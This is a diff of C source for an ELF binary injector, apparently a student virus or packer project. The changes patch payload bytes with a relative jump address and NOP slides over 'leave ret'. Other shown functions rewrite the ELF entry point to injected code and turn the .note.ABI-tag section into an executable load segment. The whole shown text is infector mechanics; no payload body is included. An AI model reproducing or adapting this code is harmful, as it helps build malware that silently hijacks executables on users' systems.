@@ -14,13 +14,21 @@ static int replace_addr(t_env *env, unsigned int needle, unsigned int replace, i
 					break;
 				}
 			}
-			if (found) {	
+			if (found) {
 				if (offset == 1) // take current position in account
 					replace -= (i * 8 + j); // replace should be negative
-				*((unsigned int *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j])) = replace;
-				// replace "leave ret" : c9c3 by NOP to slide to jmp with replaced address
+				*(unsigned int *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j + 5]) = replace - 5;
+				// replace push 0x42424242
 				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) - 3) = 0x90;
 				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) - 2) = 0x90;
+				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) - 1) = 0x90;
+				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j])) = 0x90;
+				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) + 1) = 0x90;
+				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) + 2) = 0x90;
+				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) + 3) = 0x90;
+				// replace "leave ret" : c9c3 by NOP to slide to jmp with replaced address
+				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) - 4) = 0x90;
+				*((unsigned char *)(&((unsigned char *)(&((long unsigned int *)env->payload_content)[i]))[j]) - 5) = 0x90;
 				break;
 			}
 		}
@@ -29,6 +37,7 @@ static int replace_addr(t_env *env, unsigned int needle, unsigned int replace, i
 }
 
 static void inject_code(t_env *env) {
+
 	// replace entrypoint
 	((Elf64_Ehdr *)env->obj_cpy)->e_entry = env->inject_addr + env->plt_offset;
 
@@ -103,6 +112,7 @@ static void find_injection_point(t_env *env) {
 }
 
 static void tweak_elf(t_env *env) {
+
 	// get obj header
 	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)env->obj_cpy;
 	// get sections number
@@ -142,7 +152,7 @@ static void tweak_elf(t_env *env) {
 		}
 		for (int i = 0; i < shnum; ++i) {
 			// get .note.ABI-tag shdr if no code_cave found (so it will become the new injected shdr)
-			if (shdr[i].sh_type == SHT_NOTE && strcmp(sh_strtab_p + shdr[i].sh_name, ".note.ABI-tag") == 0) {
+			if (shdr[i].sh_type == SHT_NOTE && ft_strcmp(sh_strtab_p + shdr[i].sh_name, ".note.ABI-tag") == 0) {
 				//if (DEBUG) printf("Found .note.ABI-tag at %lx, turning it to SHT_PROGBITS.\n", shdr[i].sh_offset);
 				// set the new injected shdr
 				shdr[i].sh_type = SHT_PROGBITS;
@@ -187,6 +197,7 @@ static int get_payload(t_env *env) {
 }
 
 static int handle_obj(t_env *env) {
+
 	// build payload
 	if (get_payload(env)) {
 		return -1;
@@ -226,6 +237,7 @@ static int handle_obj(t_env *env) {
 }
 
 int read_obj(t_env *env) {
+
 	int	fd;
 	void *obj;
 	int ret = 0;
@@ -257,7 +269,7 @@ int read_obj(t_env *env) {
 	}
 	else {
 		syscall_close(fd);
-		if (check_corruption(obj, buf.st_size, env->obj_name) == 0) {
+		if (check_corruption(obj, buf.st_size) == 0) {
 			env->obj = obj;
 			env->obj_size = buf.st_size;
 			env->new_obj_size = buf.st_size;
